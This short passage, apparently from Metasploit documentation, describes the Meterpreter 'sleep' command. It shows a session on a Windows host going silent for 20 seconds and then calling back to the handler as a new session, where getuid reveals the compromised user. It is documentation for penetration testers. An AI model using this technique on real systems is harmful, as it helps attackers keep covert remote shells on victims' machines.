## Silent shells
The interface to the sleep command looks like this:
```msf
meterpreter > sleep
Usage: sleep <time>

  time: Number of seconds to wait (positive integer)

  This command tells Meterpreter to go to sleep for the specified
  number of seconds. Sleeping will result in the transport being
  shut down and restarted after the designated timeout.
```

The following shows a sample run where Meterpreter is put to sleep for 20 seconds, after which the session reconnects while the handler is still in background:
```msf
meterpreter > sleep 20
[*] Telling the target instance to sleep for 20 seconds ...
[+] Target instance has gone to sleep, terminating current session.

[*] 10.1.10.35 - Meterpreter session 3 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:6005 -> 10.1.10.35:49315) at 2015-06-02 23:00:29 +1000

msf exploit(handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: WIN-S45GUQ5KGVK\OJ
```

